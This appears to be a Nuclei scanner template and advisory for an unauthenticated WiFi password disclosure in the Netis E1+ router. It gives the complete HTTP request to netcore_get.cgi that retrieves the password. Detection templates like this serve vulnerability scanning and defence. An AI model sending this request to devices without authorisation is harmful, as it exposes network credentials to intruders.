# Nuclei Template: Netis E1+ V1.2.32533 - WiFi Password Disclosure
**Template ID:** netis-info-leak
**Vulnerability Class:** Information Disclosure
**Severity:** High
**CWE:** CWE-200
**Source:** Nuclei Template (`netis-info-leak.yaml`)

## Vulnerability Information & PoC

## Description
A vulnerability in Netis allows remote unauthenticated users to disclose the WiFi password of the remote device.

## Steps to reproduce / Exploit Payload
```http
GET //netcore_get.cgi HTTP/1.1
Host: {{Hostname}}
Cookie: homeFirstShow=yes
```

## References
- https://www.exploit-db.com/exploits/48384
- https://www.netis-systems.com/
